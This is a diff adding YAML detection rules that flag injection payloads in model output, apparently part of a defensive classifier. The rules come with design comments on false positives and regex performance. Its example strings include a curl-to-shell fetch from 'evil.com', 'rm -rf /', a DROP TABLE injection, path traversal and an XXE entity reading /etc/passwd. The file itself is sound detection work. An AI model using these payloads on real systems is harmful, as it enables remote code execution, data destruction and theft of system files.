@@ -1,0 +1,125 @@
+# Signature rules for unsafe_output: payloads that a downstream app might
+# execute or render if the model reproduces them verbatim.
+#
+# Known limitation: a developer legitimately pasting a real payload to ask
+# "how do I fix this XSS?" contains the exact same string as an attack. This
+# category genuinely depends on WHERE the text is used (is this the model's
+# OUTPUT about to be rendered as HTML?) -- that context is added later via
+# the `source` hint (PLAN.md 6.4), not solved by regex alone.
+
+- id: uo_script_tag
+  category: unsafe_output
+  pattern: '<script[^>]*>.*?</script>'
+  weight: 0.9
+  description: Embedded <script> tag -- classic XSS payload
+  examples:
+    - "<script>alert(1)</script>"
+  counter_examples:
+    - "Can you explain what cross-site scripting (XSS) is and how to prevent it?"
+
+- id: uo_sql_injection
+  category: unsafe_output
+  pattern: '\bor\s+1\s*=\s*1\b|;\s*drop\s+table\b'
+  weight: 0.85
+  description: Classic SQL injection pattern (OR 1=1 / ; DROP TABLE)
+  examples:
+    - "' OR 1=1 --"
+    - "; DROP TABLE users;"
+  counter_examples:
+    - "SELECT * FROM users WHERE id = 1; -- why is this query slow?"
+
+- id: uo_shell_injection
+  category: unsafe_output
+  pattern: '(;|\|\||&&)\s*(rm\s+-rf|curl\s+\S+\s*\|\s*sh|wget\s+\S+\s*\|\s*sh)\b'
+  weight: 0.85
+  description: Shell command chaining into a destructive or remote-execution command
+  examples:
+    - "; rm -rf /"
+    - "&& curl http://evil.com/x.sh | sh"
+  counter_examples:
+    - "to remove old logs, just run rm -rf ./old_logs after backing up"
+
+- id: uo_path_traversal
+  category: unsafe_output
+  pattern: '(\.\./){2,}'
+  weight: 0.7
+  description: Path traversal sequence attempting to escape a directory sandbox
+  examples:
+    - "../../../etc/passwd"
+  counter_examples:
+    - "the file is located at ./data/../data/file.txt"
+
+- id: uo_template_injection
+  category: unsafe_output
+  # {{7*7}} is the canonical SSTI probe (OWASP/PortSwigger testing guides:
+  # inject it, check for "49" in the output) precisely because real
+  # templates reference variable names, never bare integer arithmetic.
+  pattern: '\{\{\s*\d+\s*[*+-]\s*\d+\s*\}\}'
+  weight: 0.85
+  description: Server-side template injection math probe (e.g. {{7*7}})
+  examples:
+    - "{{7*7}}"
+  counter_examples:
+    - "Hello {{ user.name }}, you have {{ cart.item_count }} items in your cart."
+
+- id: uo_open_redirect
+  category: unsafe_output
+  # The vulnerability is a redirect parameter whose value is an ABSOLUTE
+  # URL (attacker can point it anywhere) rather than a relative path (stays
+  # on-site by construction). That's the OWASP "unvalidated redirect"
+  # distinction this pattern targets.
+  pattern: '[?&](redirect|redirect_uri|url|next|return_url|dest|destination)=(https?:)?//'
+  weight: 0.8
+  description: Redirect parameter pointing to an absolute/external URL
+  examples:
+    - "?redirect=http://evil-example.com"
+  counter_examples:
+    - "our login page uses ?next=/dashboard after signing in"
+
+# uo_ssrf REVERTED (Phase 2, class 4): pattern '169\.254\.169\.254' fired
+# correctly on the attack row but also flagged hard_negative_legit_ssrf_discussion
+# ("how do I restrict access to the EC2 metadata service at 169.254.169.254")
+# and pushed train gate FPR 0.04 -> 0.05. Same structural issue as the
+# documented XSS/SQL "legit payload" collision above: the literal IP is
+# identical whether mentioned defensively or offensively. Needs the `source`
+# hint (PLAN.md 6.4), not a regex fix -- revisit there, not here.
+
+- id: uo_xxe
+  category: unsafe_output
+  # The OWASP XXE payload shape: a DOCTYPE with an internal subset declaring
+  # an ENTITY that resolves via SYSTEM to an external URI. Internal entities
+  # (no SYSTEM keyword) are ordinary, harmless XML -- SYSTEM is specifically
+  # what introduces the external-resource read. [\s\S]*? spans the gap
+  # without needing a DOTALL flag this schema doesn't support.
+  pattern: '<!DOCTYPE[^>]*\[[\s\S]*?<!ENTITY\s+\S+\s+SYSTEM\s+["\047]'
+  weight: 0.9
+  description: XML external entity (XXE) declaration via DOCTYPE/ENTITY/SYSTEM
+  examples:
+    - "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>"
+  counter_examples:
+    - "<!DOCTYPE config [<!ENTITY name \"Acme Corp\">]>"
+
+- id: uo_ldap_injection
+  category: unsafe_output
+  # A wildcard closing a value then reopening a boolean clause (*)(|( or
+  # *)(&( is the canonical LDAP filter breakout -- but that shape alone also
+  # matches legitimate nested filters combining different attributes, e.g.
+  # (&(cn=*)(|(sn=Smith)(sn=Jones))). The backreference below requires the
+  # SAME attribute name to reappear after the breakout, which is what an
+  # attacker re-targeting one field looks like, not what a legitimate
+  # multi-attribute query looks like. Not airtight -- a filter that
+  # legitimately repeats one attribute with different values still slips
+  # through -- hence weight 0.7, not higher.
+  #
+  # \w{1,64}, not \w+: unbounded + unanchored is quadratic on a long run of
+  # word characters with no '=' to find (measured: ~106s on a 100_000-char
+  # hex dump, PLAN.md §14 Phase 3.6.1). LDAP attribute names are short (cn,
+  # uid, sAMAccountName) -- 64 is generous headroom, and bounding the repeat
+  # makes the worst case linear instead of quadratic.
+  pattern: '(\w{1,64})=\*\)+\([&|]\(\1='
+  weight: 0.7
+  description: LDAP filter wildcard breakout re-targeting the same attribute (classic auth-bypass injection)
+  examples:
+    - "*)(uid=*))(|(uid=*"
+  counter_examples:
+    - "(&(cn=*)(|(sn=Smith)(sn=Jones)))"
